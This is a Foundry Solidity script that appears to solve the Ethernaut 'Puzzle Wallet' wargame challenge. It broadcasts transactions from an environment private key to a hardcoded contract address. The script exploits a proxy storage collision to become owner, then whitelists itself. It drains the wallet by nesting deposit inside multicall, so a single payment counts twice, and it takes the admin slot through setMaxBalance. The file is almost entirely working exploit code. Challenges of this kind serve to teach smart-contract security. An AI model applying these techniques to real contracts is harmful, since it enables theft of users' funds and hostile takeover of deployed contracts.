// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import "forge-std/Test.sol";

import {PuzzleWallet} from "../src/PuzzleWallet.sol";
import {IPuzzleProxy} from "../src/interface/IPuzzleProxy.sol";

contract PuzzleWalletScript is Script, Test {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        vm.startBroadcast(privateKey);

        address puzzleWallet = 0x820E98CD7A82809BcE3B66292cc0892b483AC990;
        IPuzzleProxy(puzzleWallet).proposeNewAdmin(attacker);
        assertEq(PuzzleWallet(puzzleWallet).owner(), attacker);

        PuzzleWallet(puzzleWallet).addToWhitelist(attacker);
        assertEq(PuzzleWallet(puzzleWallet).whitelisted(attacker), true);
        PuzzleWallet(puzzleWallet).addToWhitelist(puzzleWallet);
        assertEq(PuzzleWallet(puzzleWallet).whitelisted(puzzleWallet), true);

        bytes[] memory datas = new bytes[](3);
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        datas[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, innerData);
        datas[1] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        datas[2] = abi.encodeWithSelector(PuzzleWallet.execute.selector, attacker, puzzleWallet.balance * 2, "");
        PuzzleWallet(puzzleWallet).multicall{value: puzzleWallet.balance}(datas);
        assertEq(puzzleWallet.balance, 0);

        PuzzleWallet(puzzleWallet).setMaxBalance(uint256(uint160(attacker)));
        assertEq(IPuzzleProxy(puzzleWallet).admin(), attacker);

        vm.stopBroadcast();
    }
}
